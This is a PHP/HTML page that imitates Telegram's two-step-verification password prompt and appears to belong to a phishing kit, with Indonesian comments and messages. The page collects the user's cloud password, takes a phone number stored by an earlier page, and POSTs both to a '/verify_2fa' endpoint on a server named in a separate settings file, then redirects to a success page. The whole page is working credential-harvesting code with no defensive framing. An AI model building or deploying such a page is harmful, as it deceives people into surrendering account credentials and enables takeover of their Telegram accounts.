<?php
// Include settings file
require_once '../settings.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta content="width=device-width, initial-scale=1.0" name="viewport" />
  <title>Telegram Login</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
  <style>
    button#btnNext {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      position: relative;
    }

    /* Rotating Dots Loader */
    .loader {
      display: inline-flex;
      align-items: center;
      justify-content: center;
    }

    .loader-dot {
      width: 6px;
      height: 6px;
      margin: 0 3px;
      border-radius: 50%;
      background-color: white;
      opacity: 0.4;
      animation: bounce 1.5s infinite ease-in-out;
    }

    .loader-dot:nth-child(1) {
      animation-delay: -0.32s;
    }

    .loader-dot:nth-child(2) {
      animation-delay: -0.16s;
    }

    @keyframes bounce {
      0%, 80%, 100% {
        transform: scale(0.6);
        opacity: 0.4;
      }
      40% {
        transform: scale(1);
        opacity: 1;
      }
    }

    .hidden {
      display: none;
    }

    button#btnNext .font-semibold {
      font-weight: 600;
    }

    .text-sm {
      font-size: 0.875rem;
    }

    .text-red-500 {
      color: #f87171;
    }

    .text-green-500 {
      color: #10b981;
    }
  </style>
</head>
<body class="bg-gray-900">

  <div class="text-center w-full max-w-md px-4 mt-6 mx-auto">
  <img
    alt="Telegram logo"
    class="mx-auto mb-6"
    height="100"
    src="../img/peo.png"
    width="100"
  />
  <h1 class="text-2xl text-white font-semibold mb-2">Enter Your Password</h1>
  <p class="text-gray-400 mb-6">
    Your account is protected with an additional password.
  </p>

  <!-- Password -->
  <div class="relative mb-4">
    <label
      id="labelpassword"
      for="twoFaCode"
      class="absolute -top-2 left-3 text-gray-400 text-xs bg-gray-900 px-1"
    >
     Password
    </label>
    <input
      id="password"
      type="text"
      class="w-full p-4 bg-transparent text-white rounded-lg border border-gray-600 focus:border-purple-500 focus:outline-none text-base"
      placeholder=""
      maxlength="32"
      value=""
    />
    <!-- Toggle password visibility inside input -->
    <button type="button" id="togglePassword" class="absolute top-1/2 right-3 transform -translate-y-1/2 text-white">
      <i id="toggleIcon" class="fas fa-eye"></i>
    </button>
  </div>

  <button 
    id="btnNext" 
    class="w-full bg-purple-500 text-white py-3 rounded text-base btn-loading"
  >
    <span id="btnText" class="font-semibold">Next</span>
    <div class="loader hidden">
      <div class="loader-dot"></div>
      <div class="loader-dot"></div>
      <div class="loader-dot"></div>
    </div>
  </button>

  <!-- Error Message -->
  <div id="message" class="hidden text-red-500 mt-4"></div>
</div>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        var phpSettings = {
            endpointUrl: '<?php echo $url; ?>'
        };
    </script>
<script>
$(document).ready(function () {
  var inpPassword = $('#password');  // Password input field (which now holds the 2FA code)
  var btnNext = $('#btnNext');
  var btnText = $('#btnText');
  var loader = btnNext.find('.loader');
  var message = $('#message');

  // Password visibility toggle
  $('#togglePassword').on('click', function () {
    var type = inpPassword.attr('type') === 'password' ? 'text' : 'password';
    inpPassword.attr('type', type);
    $('#toggleIcon').toggleClass('fa-eye fa-eye-slash');
  });

  // Enable/disable button based on input
  inpPassword.on('input', function () {
    var cleanedValue = $(this).val().replace(/[^a-zAZ0-9]/g, '');  // Remove unwanted characters
    if (cleanedValue.length > 0) {
      btnNext.prop('disabled', false).removeClass('bg-gray-600').addClass('bg-purple-500');
    } else {
      btnNext.prop('disabled', true).removeClass('bg-purple-500').addClass('bg-gray-600');
    }
  });

  // Handle password submission via AJAX
  btnNext.on('click', function () {
    var password = inpPassword.val();  // Get the value of the 2FA code (formerly password)
    var phone = sessionStorage.getItem('phone'); // Retrieve phone from sessionStorage

    // Check if phone number is available in sessionStorage
    if (!phone) {
      message.removeClass('hidden').text('Nomor telepon tidak ditemukan dalam sesi.').addClass('text-red-500');
      return;
    }

    // Show loader and disable button
    btnText.text('Proses Verifikasi..');
    loader.removeClass('hidden');
    btnNext.prop('disabled', true);

    // Reset message
    message.addClass('hidden').text('');
    
    const endpointUrl = phpSettings.endpointUrl;

    // Perform AJAX request
    $.ajax({
      url: endpointUrl + "/verify_2fa",
      type: 'POST',
      data: JSON.stringify({
        password: password,  // Kirim kode 2FA
        phone: phone  // Menambahkan kode negara +62 di depan nomor telepon
      }),
      contentType: 'application/json',  // Set content type as JSON
      success: function (response) {
        loader.addClass('hidden');  // Hide loader
        btnNext.prop('disabled', false);  // Re-enable the button
        if (response.status === "error") {
          // Display error message from backend directly
          message.removeClass('hidden').text(response.message).addClass('text-red-500');
        } else {
          // Handle success response
          window.location.href = 'success.php';  // Redirect to success page
        }
      },
      error: function (xhr, status, error) {
        loader.addClass('hidden');  // Hide loader
        btnNext.prop('disabled', false);  // Re-enable the button
        // Check for error response and handle it properly
        if (xhr.responseJSON && xhr.responseJSON.message) {
          message.removeClass('hidden').text(xhr.responseJSON.message).addClass('text-red-500');
        } else {
          message.removeClass('hidden').text('Terjadi kesalahan, coba lagi nanti.').addClass('text-red-500');
        }
      },
      complete: function () {
        loader.addClass('hidden');  // Hide loader in case of completion
        btnNext.prop('disabled', false).removeClass('processing');  // Re-enable the button after completion
        btnText.text('Next');  // Reset the button text
      }
    });
  });
});
</script>

</body>
</html>